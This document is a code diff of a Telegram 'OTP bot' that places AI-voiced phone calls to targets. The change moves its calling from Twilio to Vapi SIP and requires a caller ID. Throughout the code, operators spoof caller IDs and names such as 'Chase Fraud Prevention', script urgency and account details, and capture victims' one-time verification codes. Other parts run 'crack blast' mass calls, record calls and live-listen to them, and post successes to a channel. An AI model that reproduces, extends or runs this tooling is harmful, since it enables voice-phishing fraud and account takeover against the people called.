@@ -3092,21 +2741,9 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                     emotion=emotion,
                     status_chat_id=chat_id,
                     status_message_id=status_message_id,
-                    queue_on_busy=True,
-                    queue_key=f"normal-{user_id_str}",
                 )
-                if twilio_sid is CALL_QUEUED:
-                    try:
-                        bot.send_message(
-                            chat_id,
-                            "⚠️ <b>ALL LINES BUSY</b>\n\nAll numbers are currently active on other calls. Your call is <b>queued</b> and will start automatically as soon as a line frees up (max 2 minutes).",
-                            parse_mode="HTML",
-                        )
-                    except Exception:
-                        pass
-                    return
-                if not twilio_sid:
-                    raise Exception("Failed to place normal call via Twilio")
+                if not vapi_call_id:
+                    raise Exception("Failed to place normal call via Vapi")
 
                 # Clear per-user call setup immediately after initiating the call
                 try:
@@ -3122,7 +2759,12 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 except Exception:
                     logger.exception("Failed to record last setup hash")
 
-                logger.info(f"✅ Twilio call {twilio_sid} initiated for user {user_id_str} to {phonenum}")
+                logger.info(f"✅ Vapi call {vapi_call_id} initiated for user {user_id_str} to {phonenum}")
+            except CallerIdRequiredError as e:
+                try:
+                    bot.send_message(chat_id, f"❌ Caller ID required: {e}")
+                except Exception:
+                    pass
             except Exception as e:
                 try:
                     bot.send_message(chat_id, f"❌ Failed to initiate normal call: {e}")
@@ -3145,7 +2787,7 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
         
         from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
         from services.prompt_builder import PromptBuilder
-        from services.twilio_service import place_ai_call
+        from services.call_service import place_ai_call, CallerIdRequiredError
         from services.voice_identity import select_agent_name
         
         if schedule_type in ("manual", "custom"):
@@ -3154,7 +2796,7 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             voice_id = str(params.get("voice_id", "")).strip() or read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
             emotion = params.get("emotion", "neutral") or "neutral"
             code_length = str(params.get("code_length", "6") or "6")
-            caller_id = str(params.get("caller_id", "")).strip() or TWILIO_PHONE_NUMBER
+            caller_id = str(params.get("caller_id", "")).strip()
             language = str(params.get("language", "")).strip() or (read_user_file(user_id, "Language.txt", "en") or "en").upper()
             delivery = str(params.get("delivery", "")).strip() or (read_user_file(user_id, "Delivery.txt", "sms") or "sms").upper()
             from_name = str(params.get("from_name", "")).strip()
@@ -3208,14 +2850,14 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
 
             overrides = metadata.to_vapi_assistant_overrides()
             overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
-            twilio_sid = place_ai_call(
+            vapi_call_id = place_ai_call(
                 to=phone,
                 user_id=user_id,
                 chat_id=chat_id,
                 customer_name=name,
                 assistant_overrides=overrides,
                 metadata=metadata.internal,
-                from_number=OUTBOUND_CALLER_ID,
+                from_number=caller_id,
                 caller_id=caller_id,
                 record=True,
                 endpoint="/schedule",
@@ -3256,14 +2898,16 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             
             overrides = metadata.to_vapi_assistant_overrides()
             overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
-            twilio_sid = place_ai_call(
+            caller_id = read_user_file(user_id, "Caller ID.txt", "").strip()
+            vapi_call_id = place_ai_call(
                 to=phone,
                 user_id=user_id,
                 chat_id=chat_id,
                 customer_name=name,
                 assistant_overrides=overrides,
                 metadata=metadata.internal,
-                from_number=OUTBOUND_CALLER_ID,
+                from_number=caller_id,
+                caller_id=caller_id,
                 record=True,
                 endpoint="/schedule",
                 mode_label=f"Scheduled {schedule_type.title()} Call",
@@ -3272,7 +2916,7 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
                 code_length=str(code_length),
             )
         
-        if twilio_sid:
+        if vapi_call_id:
             try:
                 clear_user_call_setup(user_id)
             except Exception:
@@ -3284,10 +2928,13 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             except Exception:
                 logger.exception(f"Failed to record last setup hash for user {user_id}")
             sched["status"] = "completed"
-            sched["sid"] = twilio_sid
-            logger.info(f"Scheduled call executed via Twilio bridge: {phone} -> {twilio_sid}")
+            sched["sid"] = vapi_call_id
+            logger.info(f"Scheduled call executed via Vapi SIP: {phone} -> {vapi_call_id}")
         else:
             sched["status"] = "failed"
+    except CallerIdRequiredError:
+        logger.warning("Scheduled call %s skipped: caller ID required", user_id)
+        sched["status"] = "failed"
     except Exception as e:
         logger.error(f"Schedule execution error for {user_id}: {e}")
         sched["status"] = "failed"
@@ -3560,18 +3207,12 @@ def serve_audio():
                 def _post_vouch_auto():
                     post_vouch_to_channel(call_sid, session_local.get("user_id") or "unknown", digits, override_mode="Auto Accept")
                 threading.Thread(target=_post_vouch_auto, daemon=True).start()
-            resp = VoiceResponse()
-            say_auto = "Verification successful. Thank you. Goodbye."
-            voice_id, _ = get_call_voice_info(call_sid, session_local.get("user_id") or "unknown")
-            audio_auto = None
-            if audio_auto:
-                resp.play(audio_auto)
-            else:
-                resp.say(say_auto)
-            resp.hangup()
-            client = twilio_client or get_twilio_client()
-            if client:
-                client.calls(call_sid).update(twiml=str(resp))
+            from services.vapi_service import end_call as vapi_end_call
+            vapi_call_id = session_local.get("vapi_call_id") or call_sid
+            try:
+                vapi_end_call(vapi_call_id)
+            except Exception as e:
+                logger.debug(f"Vapi end_call on auto-accept: {e}")
             if chat_id:
                 bot.send_message(chat_id, "⏳ Auto-accepted after timeout. Victim call ended successfully.")
         except Exception as e:
@@ -3634,7 +3275,7 @@ def get_crackblast_config(user_id: str) -> dict:
     return {
         "numbers": get_crackblast_numbers(user_id),
         "script": read_user_file(user_id, "crack_script.txt", "").strip(),
-        "caller_id": read_user_file(user_id, "crack_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER,
+        "caller_id": read_user_file(user_id, "crack_caller_id.txt", "").strip(),
         "voice_id": read_user_file(user_id, "crack_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID,
         "voice_name": read_user_file(user_id, "crack_voice_name.txt", "Custom") or "Custom",
         "digits": read_user_file(user_id, "crack_digits.txt", "0").strip() or "0",
@@ -3954,7 +3595,7 @@ def send_account_menu(chat_id: int, message_id: Optional[int] = None, user_id_st
     user_id_str = user_id_str or str(chat_id)
     status = get_panel_status_text(user_id_str)
     target = normalize_phone_number(read_user_file(user_id_str, "phonenum.txt", ""))
-    caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
+    caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip()
 
     text = (
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -3998,7 +3639,7 @@ def send_account_menu(chat_id: int, message_id: Optional[int] = None, user_id_st
 def send_account_number_menu(chat_id: int, message_id: Optional[int] = None, user_id_str: Optional[str] = None) -> None:
     user_id_str = user_id_str or str(chat_id)
     target = normalize_phone_number(read_user_file(user_id_str, "phonenum.txt", ""))
-    caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
+    caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip()
     text = (
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "📱 <b>MY NUMBER</b>\n"
@@ -4549,8 +4190,11 @@ def send_live_listen_panel(chat_id: int, user_id_str: str) -> None:
         bot.send_message(chat_id, "❌ No active call session found. Start a call first to use Live Listen.")
         return
     try:
-        call_status = twilio_client.calls(sid).fetch().status
+        from services.call_service import get_call_status
+        call_status = get_call_status(sid)
     except Exception:
+        call_status = None
+    if not call_status:
         bot.send_message(chat_id, "❌ Unable to fetch call data")
         return
     status_labels = {
@@ -4899,8 +4543,8 @@ def _handle_query_processing(call, _):
                 chat_id,
                 (
                     f"✅ Urgency saved: <b>{urgency}</b>.\n\n"
-                    "📞 <b>Step 6 of 11:</b> Caller ID\n\n"
-                    "The number that shows on the target's phone. Send /skip to use the default.\n"
+                    "📞 <b>Step 6 of 11:</b> Caller ID (required)\n\n"
+                    "The number that shows on the target's phone. Send /skip to use the account caller ID.\n"
                     "Example: <code>+18009359935</code>"
                 ),
                 parse_mode="HTML",
@@ -4934,7 +4578,7 @@ def _handle_query_processing(call, _):
                 "2": ("manual_call_step_2_company", "✏️ <b>EDIT — Company</b>\n\nCurrent: {cur}\nSend the new company:", "manual_company.txt"),
                 "3": ("manual_call_step_3_phone", "✏️ <b>EDIT — Target Phone</b>\n\nCurrent: {cur}\nSend the new phone (e.g. +1234567890):", "manual_phonenum.txt"),
                 "5": ("manual_call_step_5_urgency", "✏️ <b>EDIT — Urgency Level</b>\n\nCurrent: {cur}\nPick a level below (or type high / medium / low):", "urgency.txt"),
-                "6": ("manual_call_step_6_callerid", "✏️ <b>EDIT — Caller ID</b>\n\nCurrent: {cur}\nSend the new caller ID, or /skip to use the default:", "manual_caller_id.txt"),
+                "6": ("manual_call_step_6_callerid", "✏️ <b>EDIT — Caller ID</b>\n\nCurrent: {cur}\nSend the new caller ID (E.164, e.g. +1234567890):", "manual_caller_id.txt"),
                 "7": ("manual_call_step_7_displayname", "✏️ <b>EDIT — Display Name</b>\n\nCurrent: {cur}\nSend the new display name, or /skip to use the default:", "manual_display_name.txt"),
                 "8": ("manual_call_step_8_details", "✏️ <b>EDIT — Realism Details</b>\n\nCurrent: {cur}\nSend details as <code>City, State; Account; Amount; Activity</code> or /skip:", "manual_detail_city.txt"),
                 "11": ("manual_call_step_11_otp", "✏️ <b>EDIT — OTP Code Length</b>\n\nCurrent: {cur}\nSend the new code length (4–10):", "manual_otp_length.txt"),
@@ -5121,7 +4765,7 @@ def _handle_query_processing(call, _):
                 elif state == "crack_blast_step_2_script_choice":
                     write_user_file(user_id_str, "crack_script.txt", script_text)
                     next_state = "crack_blast_step_3_callerid"
-                    prompt = "💠 Step 3/7: Caller ID\nEnter the caller ID number to display, or send /skip to use the default Twilio number."
+                    prompt = "💠 Step 3/7: Caller ID\nEnter the caller ID number to display (required):"
                 else:
                     bot.send_message(chat_id, "❌ No active script flow found.")
                     return
@@ -5310,7 +4954,7 @@ def _handle_query_processing(call, _):
         if not script:
             bot.send_message(chat_id, "❌ Missing manual script. Please set it before starting the call.")
             return
-        caller_id = read_user_file(user_id_str, "manual_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER
+        caller_id = read_user_file(user_id_str, "manual_caller_id.txt", "").strip()
         voice_id = read_user_file(user_id_str, "manual_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
         code_length = read_user_file(user_id_str, "CodeLength.txt", "6").strip() or "6"
 
@@ -5351,7 +4995,7 @@ def _handle_query_processing(call, _):
                 except Exception:
                     pass
                 user_obj = types.User(id=call.from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
-                report_twilio_call_status(chat_id, sid, user=user_obj)
+                report_call_status(chat_id, sid, user=user_obj)
             except Exception as e:
                 bot.send_message(chat_id, f"❌ Failed to initiate manual call: {e}")
 
@@ -5403,7 +5047,7 @@ def _handle_query_processing(call, _):
         if not script:
             bot.send_message(chat_id, "❌ Missing custom script. Please set it before starting the call.")
             return
-        caller_id = read_user_file(user_id_str, "custom_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER
+        caller_id = read_user_file(user_id_str, "custom_caller_id.txt", "").strip()
         voice_id = read_user_file(user_id_str, "custom_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
         digits = read_user_file(user_id_str, "custom_digits.txt", "0").strip()
         delay = read_user_file(user_id_str, "custom_delay.txt", "0").strip() or "0"
@@ -5447,7 +5091,7 @@ def _handle_query_processing(call, _):
                 except Exception:
                     pass
                 user_obj = types.User(id=call.from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
-                report_twilio_call_status(chat_id, sid, user=user_obj)
+                report_call_status(chat_id, sid, user=user_obj)
             except Exception as e:
                 bot.send_message(chat_id, f"❌ Failed to initiate custom call: {e}")
 
@@ -5641,7 +5285,7 @@ def _handle_query_processing(call, _):
                     pass
 
                 user_obj = types.User(id=call.from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
-                report_twilio_call_status(chat_id, sid, user=user_obj)
+                report_call_status(chat_id, sid, user=user_obj)
             except Exception as e:
                 bot.send_message(chat_id, f"❌ Failed to initiate custom call: {str(e)}")
 
@@ -6480,11 +6124,6 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
                 time.sleep(2)
             except Exception as e:
                 logger.debug(f"Vapi say on accept: {e}")
-        from services.twilio_service import end_call as twilio_end_call
-        try:
-            twilio_end_call(call_sid)
-        except Exception as e:
-            logger.debug(f"Twilio end_call on accept: {e}")
         if vapi_id:
             from services.vapi_service import end_call as vapi_end_call
             try:
@@ -6515,8 +6154,6 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
                 if attempts >= 3:
                     say_to_assistant(vapi_id, "I can't verify the code. Please contact support. Goodbye.")
                     time.sleep(2)
-                    from services.twilio_service import end_call as twilio_end_call
-                    twilio_end_call(call_sid)
                     from services.vapi_service import end_call as vapi_end_call
                     vapi_end_call(vapi_id)
                 else:
@@ -6535,26 +6172,27 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
     bot.send_message(chat_id, "ℹ️ Unknown command. Use /start to return.")
 
 # ======================================================================
-# REPORT TWILIO CALL STATUS (non-blocking, faster)
+# REPORT CALL STATUS (non-blocking, Vapi-based)
 # ======================================================================
-def _report_twilio_call_status(chat_id: int, sid: str, user: Optional[types.User] = None, max_checks: int = 4, interval: int = 3) -> Optional[str]:
+def _report_call_status(chat_id: int, sid: str, user: Optional[types.User] = None, max_checks: int = 4, interval: int = 3) -> Optional[str]:
     if not sid:
-        logger.warning("Skipping Twilio status polling because CallSid is missing")
+        logger.warning("Skipping call status polling because call id is missing")
         return None
+    from services.call_service import get_call_status
     last_status = None
     status = None
     for _ in range(max_checks):
         try:
-            status = twilio_client.calls(sid).fetch().status
+            status = get_call_status(sid)
         except Exception as e:
-            logger.warning(f"Status check exception for CallSid={sid}: {e}", exc_info=True)
+            logger.warning(f"Status check exception for CallId={sid}: {e}", exc_info=True)
             try:
                 bot.send_message(chat_id, f"❌ Status check error: {str(e)[:120]}")
             except Exception:
                 pass
             return None
 
-        if status in ["completed", "failed", "no-answer", "busy", "canceled"]:
+        if status in ("completed", "failed", "no-answer", "busy", "canceled"):
             break
         time.sleep(interval)
 
@@ -6596,9 +6234,9 @@ def _report_twilio_call_status(chat_id: int, sid: str, user: Optional[types.User
     return status
 
 
-def report_twilio_call_status(chat_id: int, sid: str, user: Optional[types.User] = None, max_checks: int = 4, interval: int = 3) -> threading.Thread:
+def report_call_status(chat_id: int, sid: str, user: Optional[types.User] = None, max_checks: int = 4, interval: int = 3) -> threading.Thread:
     thread = threading.Thread(
-        target=_report_twilio_call_status,
+        target=_report_call_status,
         args=(chat_id, sid, user, max_checks, interval),
         daemon=True,
     )
@@ -6606,36 +6244,12 @@ def report_twilio_call_status(chat_id: int, sid: str, user: Optional[types.User]
     return thread
 
 def _download_recording(chat_id: int, sid: str, user_id: Optional[str] = None):
-    recordings = twilio_client.calls(sid).recordings.list(limit=1)
-    if not recordings:
-        bot.send_message(chat_id, "✅ Call completed. No recording available.")
-        return
-    recording = recordings[0]
-    recording_uri = recording.uri.replace(".json", ".mp3")
-    r = _http.get(
-        f"https://api.twilio.com{recording_uri}",
-        auth=HTTPBasicAuth(ACCOUNT_SID, AUTH_TOKEN),
-        timeout=REQ_TIMEOUT
-    )
-    record_dir = ensure_user_path(user_id) if user_id else None
-    if record_dir and r.status_code == 200 and r.content:
-        if len(r.content) < 128:
-            bot.send_message(chat_id, "⚠️ Recording download completed but file appears too small. No audio sent.")
-            logger.warning(f"Recording too small for CallSid={sid}: {len(r.content)} bytes")
-            return
-        record_path = record_dir / "record.mp3"
-        call_path = record_dir / f"{sid}.mp3"
-        record_path.write_bytes(r.content)
-        call_path.write_bytes(r.content)
-        bot.send_message(chat_id, "✅ Call completed. Recording saved.")
-        try:
-            with open(record_path, "rb") as f:
-                bot.send_audio(chat_id, f)
-        except Exception as e:
-            logger.warning(f"Failed to send completed recording: {e}")
-            bot.send_message(chat_id, "⚠️ Recording saved but could not send audio to chat.")
-    else:
-        bot.send_message(chat_id, "✅ Call completed. Recording saved (no user_id) or recording unavailable.")
+    try:
+        from handlers.vapi_webhooks import _fetch_and_send_recording_via_api
+        _fetch_and_send_recording_via_api(sid, sid, chat_id, user_id)
+    except Exception as e:
+        logger.warning(f"Failed to fetch Vapi recording for call {sid}: {e}")
+        bot.send_message(chat_id, "✅ Call completed.")
 
 # ======================================================================
 # FORMAT PAYMENT ADDRESSES
@@ -6941,8 +6555,8 @@ def handle_stateful_text(message):
         set_user_state(user_id_str, "manual_call_step_6_callerid")
         bot.send_message(
             message.chat.id,
-            "✅ Urgency saved.\n\n📞 <b>Step 6 of 11:</b> Caller ID\n\n"
-            "The number that shows on the target's phone. Send /skip to use the default.\n"
+            "✅ Urgency saved.\n\n📞 <b>Step 6 of 11:</b> Caller ID (required)\n\n"
+            "The number that shows on the target's phone. Send /skip to use the account caller ID.\n"
             "Example: <code>+18009359935</code>",
             parse_mode="HTML",
         )
@@ -6951,12 +6565,15 @@ def handle_stateful_text(message):
     if state == "manual_call_step_6_callerid":
         caller_input = text.strip()
         if caller_input.lower() in ("skip", "/skip", ""):
-            caller = TWILIO_PHONE_NUMBER
+            caller = read_user_file(user_id_str, "Caller ID.txt", "").strip()
         else:
             caller = normalize_phone_number(caller_input)
             if not is_valid_e164(caller):
                 bot.send_message(message.chat.id, "❌ Invalid caller ID. Use +1234567890 or /skip")
                 return
+        if not caller:
+            bot.send_message(message.chat.id, "❌ Caller ID is required. Provide a caller ID in E.164 format, e.g. +1234567890.")
+            return
         write_user_file(user_id_str, "manual_caller_id.txt", caller)
         write_user_file(user_id_str, "Caller ID.txt", caller)
         if _manual_edit_return(user_id_str, message.chat.id):
@@ -6965,7 +6582,7 @@ def handle_stateful_text(message):
         bot.send_message(
             message.chat.id,
             "✅ Caller ID saved.\n\n💠 <b>Step 7 of 11:</b> Display Name\n\n"
-            "The name the agent uses as the caller identity. Send /skip to use the default.\n"
+            "The name the agent uses as the caller identity.\n"
             "Example: <code>Chase Fraud Prevention</code>",
             parse_mode="HTML",
         )
@@ -7188,7 +6805,7 @@ def handle_stateful_text(message):
                 "company": read_user_file(user_id_str, "manual_company.txt", ""),
                 "script": read_user_file(user_id_str, "manual_script.txt", ""),
                 "voice_id": read_user_file(user_id_str, "manual_voice_id.txt", DEFAULT_VOICE_ID),
-                "caller_id": read_user_file(user_id_str, "manual_caller_id.txt", TWILIO_PHONE_NUMBER),
+                "caller_id": read_user_file(user_id_str, "manual_caller_id.txt", ""),
                 "from_name": read_user_file(user_id_str, "From Name.txt", ""),
                 "code_length": read_user_file(user_id_str, "CodeLength.txt", "6"),
                 "scenario": read_user_file(user_id_str, "Scenario.txt", ""),
@@ -7229,19 +6846,23 @@ def handle_stateful_text(message):
             return
         write_user_file(user_id_str, "custom_phonenum.txt", phone)
         set_user_state(user_id_str, "custom_call_step_4_callerid")
-        bot.send_message(message.chat.id, "💠 Step 3/8: Caller ID\nEnter the caller ID number to display, or send /skip to use the default. Example: +1234567890")
+        bot.send_message(message.chat.id, "💠 Step 3/8: Caller ID (required)\nEnter the caller ID number to display. Example: +1234567890")
         return
 
     if state == "custom_call_step_4_callerid":
         caller_input = text.strip()
         if caller_input.lower() in ("skip", "/skip", ""):
-            caller = TWILIO_PHONE_NUMBER
+            caller = read_user_file(user_id_str, "Caller ID.txt", "").strip()
         else:
             caller = normalize_phone_number(caller_input)
             if not is_valid_e164(caller):
-                bot.send_message(message.chat.id, "❌ Invalid caller ID. Use +1234567890 or /skip")
+                bot.send_message(message.chat.id, "❌ Invalid caller ID. Use +1234567890")
                 return
+        if not caller:
+            bot.send_message(message.chat.id, "❌ Caller ID is required. Provide a caller ID in E.164 format, e.g. +1234567890.")
+            return
         write_user_file(user_id_str, "custom_caller_id.txt", caller)
+        write_user_file(user_id_str, "Caller ID.txt", caller)
         set_user_state(user_id_str, "custom_call_step_5_voice")
         bot.send_message(message.chat.id, "🎤 Step 4/8: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
         try:
@@ -7325,7 +6946,7 @@ def handle_stateful_text(message):
             custom_params = {
                 "script": read_user_file(user_id_str, "custom_script.txt", ""),
                 "voice_id": read_user_file(user_id_str, "custom_voice_id.txt", DEFAULT_VOICE_ID),
-                "caller_id": read_user_file(user_id_str, "custom_caller_id.txt", TWILIO_PHONE_NUMBER),
+                "caller_id": read_user_file(user_id_str, "custom_caller_id.txt", ""),
                 "delay": read_user_file(user_id_str, "custom_delay.txt", "0"),
                 "fallback": read_user_file(user_id_str, "custom_fallback.txt", ""),
                 "digits": read_user_file(user_id_str, "custom_digits.txt", "0"),
@@ -7375,7 +6996,7 @@ def handle_stateful_text(message):
             return
         write_user_file(user_id_str, "crack_script.txt", text)
         set_user_state(user_id_str, "crack_blast_step_3_callerid")
-        bot.send_message(message.chat.id, "💠 Step 3/7: Caller ID\nEnter caller ID to display, or send /skip to use the default Twilio number.")
+        bot.send_message(message.chat.id, "💠 Step 3/7: Caller ID (required)\nEnter caller ID to display. Example: +1234567890")
         return
 
     if state == "crack_blast_step_2_script_input":
@@ -7389,19 +7010,23 @@ def handle_stateful_text(message):
             return
         write_user_file(user_id_str, "crack_script.txt", text)
         set_user_state(user_id_str, "crack_blast_step_3_callerid")
-        bot.send_message(message.chat.id, "💠 Step 3/7: Caller ID\nEnter caller ID to display, or send /skip to use the default Twilio number.")
+        bot.send_message(message.chat.id, "💠 Step 3/7: Caller ID (required)\nEnter the caller ID number to display. Example: +1234567890")
         return
 
     if state == "crack_blast_step_3_callerid":
         caller_input = text.strip()
         if caller_input.lower() in ("skip", "/skip", ""):
-            caller = TWILIO_PHONE_NUMBER
+            caller = read_user_file(user_id_str, "Caller ID.txt", "").strip()
         else:
             caller = normalize_phone_number(caller_input)
             if not is_valid_e164(caller):
-                bot.send_message(message.chat.id, "❌ Invalid caller ID. Use +1234567890 or /skip.")
+                bot.send_message(message.chat.id, "❌ Invalid caller ID. Use +1234567890.")
                 return
+        if not caller:
+            bot.send_message(message.chat.id, "❌ Caller ID is required. Provide a caller ID in E.164 format, e.g. +1234567890.")
+            return
         write_user_file(user_id_str, "crack_caller_id.txt", caller)
+        write_user_file(user_id_str, "Caller ID.txt", caller)
         set_user_state(user_id_str, "crack_blast_step_4_voice")
         bot.send_message(message.chat.id, "🎤 Step 4/7: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
         try:
@@ -7504,9 +7129,12 @@ def handle_stateful_text(message):
             bot.send_message(message.chat.id, "❌ Invalid phone format. Use +1234567890")
             return
         if caller_input.lower() in ("", "skip", "/skip"):
-            caller_clean = TWILIO_PHONE_NUMBER  # Use default Twilio number
+            caller_clean = read_user_file(user_id_str, "Caller ID.txt", "").strip()  # Use account caller ID
         elif not is_valid_e164(caller_clean):
-            bot.send_message(message.chat.id, "❌ Invalid caller ID format. Use +1234567890 or skip for default")
+            bot.send_message(message.chat.id, "❌ Invalid caller ID format. Use +1234567890.")
+            return
+        if not caller_clean:
+            bot.send_message(message.chat.id, "❌ Caller ID is required. Set a caller ID first (e.g. +1234567890).")
             return
         if language not in ("en", "fr"):
             bot.send_message(message.chat.id, "❌ Language must be EN or FR.")
@@ -7901,12 +7529,12 @@ Confirm sending?"""
         if raw in ("/skip", "skip", "default", "none", "reset"):
             write_user_file(user_id_str, "Caller ID.txt", "")
             clear_user_state(user_id_str)
-            bot.send_message(message.chat.id, f"✅ Caller ID reset to default: <code>{html.escape(TWILIO_PHONE_NUMBER)}</code>", parse_mode="HTML")
+            bot.send_message(message.chat.id, "ℹ️ Caller ID cleared. Set a caller ID before starting a call (required).", parse_mode="HTML")
             send_account_number_menu(message.chat.id, None, user_id_str)
             return
         caller = normalize_phone_number(text)
         if not caller or not is_valid_e164(caller):
-            bot.send_message(message.chat.id, "❌ Invalid Caller ID. Use format: <code>+1234567890</code> (or send 'skip' for default)", parse_mode="HTML")
+            bot.send_message(message.chat.id, "❌ Invalid Caller ID. Use format: <code>+1234567890</code>", parse_mode="HTML")
             return
         write_user_file(user_id_str, "Caller ID.txt", caller)
         clear_user_state(user_id_str)
@@ -8325,28 +7953,39 @@ def my_scripts_command(message):
 @bot.message_handler(commands=["skip"])
 def skip_command(message):
     """
-    Skip optional steps in call setup and use the default Twilio caller ID.
+    Skip optional steps in call setup using the account default caller ID.
     """
     user_id_str = str(message.from_user.id)
     state = get_user_state(user_id_str)
 
     if state == "normal_call_step_4_callerid":
-        write_user_file(user_id_str, "Caller ID.txt", "")
+        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip()
+        if not caller_id:
+            bot.send_message(
+                message.chat.id,
+                "❌ Caller ID is required and none is set on this account.\n"
+                "Enter a caller ID in E.164 format, e.g. `+1234567890`.",
+            )
+            return
         set_user_state(user_id_str, "normal_call_step_5_fromname")
         name = read_user_file(user_id_str, "Name.txt", "Customer")
         bot.send_message(
             message.chat.id,
-            f"ℹ️ Caller ID set to default: {TWILIO_PHONE_NUMBER}\n"
+            f"ℹ️ Using account caller ID: {caller_id}\n"
             f"💠 Step 6/11: Display Name\n\n"
             f"👤 Name: {name}\n"
-            f"📞 Caller ID: {TWILIO_PHONE_NUMBER}\n"
+            f"📞 Caller ID: {caller_id}\n"
             f"Enter display name (shown on caller ID):\n"
             f"— Example: Support Team",
         )
         return
 
     if state == "manual_call_step_2_callerid":
-        write_user_file(user_id_str, "manual_caller_id.txt", TWILIO_PHONE_NUMBER)
+        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip()
+        if not caller_id:
+            bot.send_message(message.chat.id, "❌ Caller ID is required and none is set on this account. Enter a caller ID in E.164 format, e.g. `+1234567890`.")
+            return
+        write_user_file(user_id_str, "manual_caller_id.txt", caller_id)
         set_user_state(user_id_str, "manual_call_step_3_script_choice")
         buttons = types.InlineKeyboardMarkup(row_width=1)
         buttons.add(types.InlineKeyboardButton("✍️ Paste custom script", callback_data="script_paste"))
@@ -8354,15 +7993,19 @@ def skip_command(message):
         buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
         bot.send_message(
             message.chat.id,
-            "✅ Caller ID set to default.\n\n💠 Step 3/8: Script\nChoose whether to paste a new script or select one from your library.",
+            "✅ Using account caller ID.\n\n💠 Step 3/8: Script\nChoose whether to paste a new script or select one from your library.",
             reply_markup=buttons,
         )
         return
 
     if state == "custom_call_step_4_callerid":
-        write_user_file(user_id_str, "custom_caller_id.txt", TWILIO_PHONE_NUMBER)
+        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip()
+        if not caller_id:
+            bot.send_message(message.chat.id, "❌ Caller ID is required and none is set on this account. Enter a caller ID in E.164 format, e.g. `+1234567890`.")
+            return
+        write_user_file(user_id_str, "custom_caller_id.txt", caller_id)
         set_user_state(user_id_str, "custom_call_step_5_voice")
-        bot.send_message(message.chat.id, "✅ Caller ID set to default.\n\n🎤 Step 4/8: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
+        bot.send_message(message.chat.id, "✅ Using account caller ID.\n\n🎤 Step 4/8: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
         try:
             from menu_utils import build_voice_selection_keyboard
             keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
@@ -8372,9 +8015,13 @@ def skip_command(message):
         return
 
     if state == "crack_blast_step_3_callerid":
-        write_user_file(user_id_str, "crack_caller_id.txt", TWILIO_PHONE_NUMBER)
+        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip()
+        if not caller_id:
+            bot.send_message(message.chat.id, "❌ Caller ID is required and none is set on this account. Enter a caller ID in E.164 format, e.g. `+1234567890`.")
+            return
+        write_user_file(user_id_str, "crack_caller_id.txt", caller_id)
         set_user_state(user_id_str, "crack_blast_step_4_voice")
-        bot.send_message(message.chat.id, "✅ Caller ID set to default.\n\n🎤 Step 4/7: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
+        bot.send_message(message.chat.id, "✅ Using account caller ID.\n\n🎤 Step 4/7: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
         try:
             from menu_utils import build_voice_selection_keyboard
             keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
@@ -8978,7 +8625,7 @@ if __name__ == "__main__":
     logger.info(f"Live Listen:           {LIVE_LISTEN_URL}")
     logger.info(f"Telegram Polling:      {'ACTIVE' if runtime_mode == 'full' else 'DISABLED'}")
     logger.info(f"Webhook Mode:          {USE_WEBHOOK}")
-    logger.info(f"Twilio Configured:     {'YES' if twilio_client else 'NO'}")
+    logger.info(f"Telephony:             {'Vapi SIP + Asterisk configured' if is_telephony_configured() else 'Vapi SIP + Asterisk NOT configured'}")
     logger.info("="*70 + "\n")
     
     logger.info("Main process entering keepalive loop while background services run.")
